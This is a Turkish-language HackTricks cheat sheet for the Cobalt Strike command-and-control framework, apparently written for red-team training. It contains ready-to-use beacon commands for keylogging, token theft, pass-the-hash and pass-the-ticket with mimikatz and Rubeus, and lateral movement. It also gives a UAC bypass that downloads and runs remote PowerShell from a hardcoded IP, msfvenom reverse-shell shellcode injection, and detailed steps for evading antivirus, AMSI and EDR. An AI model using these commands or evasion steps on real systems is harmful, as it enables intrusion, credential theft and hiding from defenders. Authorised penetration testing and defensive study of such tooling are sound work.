# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listener'lar

### C2 Listener'ları

`Cobalt Strike -> Listeners -> Add/Edit` ardından nerede dinleme yapılacağını, hangi tür beacon kullanılacağını (http, dns, smb...) ve daha fazlasını seçebilirsiniz.

### Peer2Peer Listener'ları

Bu listener'ların beacon'larının doğrudan C2 ile iletişim kurması gerekmez; diğer beacon'lar üzerinden C2 ile iletişim kurabilirler.

`Cobalt Strike -> Listeners -> Add/Edit` ardından TCP veya SMB beacon'larını seçmeniz gerekir

* **TCP beacon, seçilen portta bir listener ayarlar**. Bir TCP beacon'a bağlanmak için başka bir beacon'dan `connect <ip> <port>` komutunu kullanın
* **smb beacon, seçilen ada sahip bir pipename üzerinde dinleme yapar**. Bir SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.

### Payload'ları Generate Etme ve Host Etme

#### Payload'ları dosyalarda Generate Etme

`Attacks -> Packages ->`

* HTA dosyaları için **`HTMLApplication`**
* Macro içeren bir Office belgesi için **`MS Office Macro`**
* Bir .exe, .dll veya service .exe için **`Windows Executable`**
* **stageless** bir .exe, .dll veya service .exe için **`Windows Executable (S)`** (staged yerine stageless daha iyidir, daha az IoC)

#### Payload'ları Generate Etme ve Host Etme

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Bu, beacon'ı Cobalt Strike'tan indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/executable oluşturur

#### Payload'ları Host Etme

Host etmek istediğiniz dosya zaten bir web server'da bulunuyorsa `Attacks -> Web Drive-by -> Host File` bölümüne gidin, ardından host edilecek dosyayı ve web server yapılandırmasını seçin.

### Beacon Seçenekleri

<details>
<summary>Beacon seçenekleri ve komutları</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Bir custom agent'ın register/check-in işlemi yapıp görevleri alabilmesi için yalnızca Cobalt Strike Team Server HTTP/S protocol'ünü (varsayılan malleable C2 profile) konuşması gerekir. Cobalt Strike UI'ını tasking ve output için yeniden kullanmak amacıyla profile'da tanımlanan URI/header/metadata crypto yapılarını uygulayın.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Bir Aggressor Script (ör. `CustomBeacon.cna`), Windows dışı beacon için payload üretimini kapsayabilir; böylece operator listener'ı seçebilir ve doğrudan GUI üzerinden ELF payload'ları oluşturabilir.
- Team Server'a sunulan örnek Linux task handler'ları: `sleep`, `cd`, `pwd`, `shell` (keyfi komutları çalıştırır), `ls`, `upload`, `download` ve `exit`. Bunlar Team Server'ın beklediği task ID'lerine eşlenir ve uygun formatta output döndürmek için server-side uygulanmalıdır.
- Linux üzerinde BOF desteği, [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) ile Beacon Object Files'ı in-process yükleyerek eklenebilir (Outflank-style BOF'ları da destekler). Bu sayede modular post-exploitation, yeni process'ler başlatmadan implant'ın context/privileges'ı içinde çalıştırılabilir.<sup>[[2]](#references)[[3]](#references)</sup>
- Windows Beacon'larıyla pivoting parity'sini korumak için custom beacon içine bir SOCKS handler ekleyin: operator `socks <port>` çalıştırdığında implant, operator tooling'i compromised Linux host üzerinden internal network'lere yönlendirmek üzere local proxy açmalıdır.

## Opsec

### Execute-Assembly

**`execute-assembly`**, belirtilen programı çalıştırmak için remote process injection kullanan bir **sacrificial process** kullanır. Bir process'in içine injection yapmak için her EDR'ın kontrol ettiği belirli Win API'ler kullanıldığından bu işlem oldukça gürültülüdür. Ancak bir şeyi aynı process içinde yüklemek için kullanılabilecek bazı custom tool'lar vardır:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike içinde BOF (Beacon Object Files) da kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

`https://github.com/outflanknl/HelpColor` agressor script'i, Cobalt Strike içinde komutlara renk ekleyen `helpx` command'ını oluşturur. Bu renkler, komutların BOF (green), Frok&Run (yellow) veya ProcessExecution, injection ve benzeri (red) olup olmadığını gösterir. Bu da hangi komutların daha stealthy olduğunu anlamaya yardımcı olur.

### Kullanıcı gibi davran

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` gibi event'leri kontrol edebilirsiniz:

- Security EID 4624 - Olağan çalışma saatlerini öğrenmek için tüm interactive logon'ları kontrol edin.
- System EID 12,13 - Shutdown/startup/sleep sıklığını kontrol edin.
- Security EID 4624/4625 - Inbound geçerli/geçersiz NTLM attempt'lerini kontrol edin.
- Security EID 4648 - Bu event, plaintext credentials logon için kullanıldığında oluşturulur. Bir process bunu oluşturduysa binary, credentials'ı clear text olarak bir config file'da veya code içinde barındırıyor olabilir.

Cobalt Strike'tan `jump` kullanırken, yeni process'in daha legitimate görünmesi için `wmi_msbuild` method'unu kullanmak daha iyidir.

### Computer accounts kullanın

Defender'ların users tarafından oluşturulan şüpheli davranışları kontrol etmesi ve **`*$` gibi service accounts ile computer accounts'ı monitoring kapsamı dışında bırakması** yaygındır. Lateral movement veya privilege escalation gerçekleştirmek için bu accounts'ları kullanabilirsiniz.

### Stageless payload'lar kullanın

Stageless payload'lar, C2 server'dan ikinci bir stage indirmeleri gerekmediğinden staged payload'lara göre daha az gürültülüdür. Bu, initial connection'dan sonra network traffic oluşturmadıkları anlamına gelir ve network-based defense'ler tarafından tespit edilme olasılıkları daha düşüktür.

### Tokens & Token Store

Token'ları steal veya generate ederken dikkatli olun; bir EDR'ın tüm thread'lerin tüm token'larını enumerate etmesi ve process içinde **farklı bir user'a veya hatta SYSTEM'e ait bir token** bulması mümkün olabilir.

Bu özellik token'ları **beacon başına** saklamayı sağlar; böylece aynı token'ı tekrar tekrar steal etmek gerekmez. Bu, lateral movement sırasında veya stolen token'ı birden fazla kez kullanmanız gerektiğinde faydalıdır:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Lateral movement sırasında genellikle **yeni bir token generate etmekten** veya pass the hash attack gerçekleştirmektense **bir token steal etmek** daha iyidir.

### Guardrails

Cobalt Strike, defender'lar tarafından tespit edilebilecek belirli command veya action'ların kullanılmasını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails; lateral movement veya privilege escalation için yaygın olarak kullanılan `make_token`, `jump`, `remote-exec` ve diğer belirli command'ları block edecek şekilde yapılandırılabilir.

Ayrıca [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) repo'su da bir payload execute etmeden önce değerlendirebileceğiniz bazı check ve fikirler içerir.

### Tickets encryption

Bir AD içinde ticket'ların encryption'ına dikkat edin. Varsayılan olarak bazı tool'lar Kerberos ticket'ları için AES encryption'dan daha az güvenli olan RC4 encryption kullanır; güncel environment'lar ise varsayılan olarak AES kullanır. Bu durum, weak encryption algorithm'leri izleyen defender'lar tarafından tespit edilebilir.

### Varsayılanlardan kaçının

Cobalt Stricke kullanılırken varsayılan olarak SMB pipe'ları `msagent_####` ve `"status_####"` adlarına sahip olur. Bu adları değiştirin. Cobal Strike'ta mevcut pipe'ların adlarını `ls \\.\pipe\` command'ı ile kontrol etmek mümkündür.

Ayrıca SSH session'larıyla `\\.\pipe\postex_ssh_####` adlı bir pipe oluşturulur. Bunu `set ssh_pipename "<new_name>";` ile değiştirin.

Ayrıca poext exploitation attack sırasında `\\.\pipe\postex_####` pipe'ları `set pipename "<new_name>"` ile değiştirilebilir.

Cobalt Strike profile'larında aşağıdaki gibi şeyleri de değiştirebilirsiniz:

- `rwx` kullanmaktan kaçınma
- Process injection davranışının nasıl çalıştığı (`process-inject {...}` block'unda hangi API'lerin kullanılacağı)
- "fork and run" işleminin nasıl çalıştığı (`post-ex {…}` block'unda)
- Sleep süresi
- Memory'de yüklenecek binary'lerin maximum size'ı
- `stage {...}` block'u ile memory footprint ve DLL content'i
- Network traffic

### Memory scanning'i bypass edin

Bazı ERD'ler memory'yi bilinen malware signature'ları için scan eder. Coblat Strike, `sleep_mask` function'ını memory'deki bacldoor'u encrypt edebilen bir BOF olarak değiştirmeye izin verir.

### Gürültülü proc injection'ları

Bir process'e code inject etmek genellikle oldukça gürültülüdür; bunun nedeni **hiçbir regular process'in genellikle bu action'ı gerçekleştirmemesi ve bunu yapma yöntemlerinin oldukça sınırlı olmasıdır**. Bu nedenle behaviour-based detection system'ları tarafından tespit edilebilir. Ayrıca process'leri network üzerinden **disk üzerinde bulunmayan code içeren thread'ler** için scan eden EDR'lar tarafından da tespit edilebilir (browser gibi JIT kullanan process'ler bunu yaygın olarak gerçekleştirse de). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Yeni bir process spawn ederken detection'dan kaçınmak için process'ler arasındaki **regular parent-child** ilişkisini korumak önemlidir. svchost.exec, iexplorer.exe'yi execute ediyorsa bu şüpheli görünür; çünkü normal bir Windows environment'ında svchost.exe, iexplorer.exe'nin parent'ı değildir.

Cobalt Strike'ta varsayılan olarak yeni bir beacon spawn edildiğinde, yeni listener'ı çalıştırmak için **`rundll32.exe`** kullanan bir process oluşturulur. Bu yöntem çok stealthy değildir ve EDR'lar tarafından kolayca tespit edilebilir. Ayrıca `rundll32.exe` herhangi bir argüman olmadan çalıştırıldığından daha da şüpheli görünür.

Aşağıdaki Cobalt Strike command'ı ile yeni beacon'ı spawn etmek için farklı bir process belirleyebilir ve detection olasılığını azaltabilirsiniz:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Saldırgan trafiğini proxy'leme

Saldırganların bazen araçları yerel olarak, hatta Linux makinelerde bile çalıştırabilmesi ve kurbanların trafiğinin araca ulaşmasını sağlaması gerekir (ör. NTLM relay).

Ayrıca bazen bir pass-the.hash veya pass-the-ticket saldırısı gerçekleştirmek için saldırganın bu hash'i veya ticket'ı yerel olarak kendi LSASS process'ine **eklemesi** ve ardından kurban makinenin bir LSASS process'ini değiştirmek yerine bu process üzerinden pivot etmesi daha stealth olabilir.

Ancak **oluşturulan trafiğe dikkat etmeniz** gerekir; backdoor process'inizden alışılmadık bir trafik (Kerberos?) gönderiyor olabilirsiniz. Bunun için bir browser process'ine pivot edebilirsiniz (ancak kendinizi bir process'e inject ederken yakalanabilirsiniz; bu nedenle bunu yapmanın stealth bir yolunu düşünün).


### AV'lerden kaçınma

#### AV/AMSI/ETW Bypass

Sayfayı kontrol edin:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Genellikle `/opt/cobaltstrike/artifact-kit` içinde, Cobalt Strike'ın binary beacon'lar oluşturmak için kullanacağı payload'ların kodunu ve önceden derlenmiş template'lerini (`/src-common` içinde) bulabilirsiniz.

Oluşturulan backdoor ile (veya yalnızca derlenmiş template ile) [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak Defender'ın tetiklenmesine neyin neden olduğunu bulabilirsiniz. Bu genellikle bir string'dir. Bu nedenle backdoor'u oluşturan kodu, bu string final binary'de görünmeyecek şekilde değiştirebilirsiniz.

Kodu değiştirdikten sonra aynı dizinden `./build.sh` komutunu çalıştırın ve `dist-pipe/` klasörünü Windows client'ına `C:\Tools\cobaltstrike\ArtifactKit` içine kopyalayın.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna` agresif script'ini yüklemeyi unutmayın; böylece Cobalt Strike'a yüklenenleri değil, istediğimiz disk üzerindeki kaynakları kullanmasını belirtmiş oluruz.

#### Resource Kit

ResourceKit klasörü, PowerShell, VBA ve HTA dahil olmak üzere Cobalt Strike'ın script tabanlı payload'ları için şablonları içerir.

Şablonlarla birlikte [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak Defender'ın (bu durumda AMSI) neyi beğenmediğini bulabilir ve bunu değiştirebilirsiniz:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Algılanan satırlar değiştirilerek yakalanmayacak bir template oluşturulabilir.

Cobalt Strike'a istediğimiz kaynakları diskten kullanmasını ve yüklenen kaynakları kullanmamasını belirtmek için aggressive script olan `ResourceKit\resources.cna` dosyasını yüklemeyi unutmayın.

#### Function hooks | Syscall

Function hooking, ERD'lerin malicious activity tespit etmek için kullandığı çok yaygın bir yöntemdir. Cobalt Strike, **`None`** config'ini kullanarak standart Windows API çağrıları yerine **syscalls** kullanıp bu hook'ları bypass etmenize, **`Direct`** ayarıyla bir fonksiyonun `Nt*` sürümünü kullanmanıza veya malleable profile içindeki **`Indirect`** seçeneğiyle `Nt*` fonksiyonunun üzerinden atlamanıza olanak tanır. Sisteme bağlı olarak bir seçenek diğerinden daha stealth olabilir.

Bu, profile içinde veya **`syscall-method`** komutuyla ayarlanabilir.

Ancak bu işlem de gürültülü olabilir.

Cobalt Strike'ın function hook'larını bypass etmek için sunduğu seçeneklerden biri, şu araçla bu hook'ları kaldırmaktır: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Ayrıca hangi fonksiyonların hook'landığını [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) veya [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) ile kontrol edebilirsiniz.




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referanslar

- [1] [Cobalt Strike Linux Beacon (özel implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader ve Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF şablonu](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42'nin Cobalt Strike metadata encryption analizi](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike trafiği hakkında SANS ISC günlüğü](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
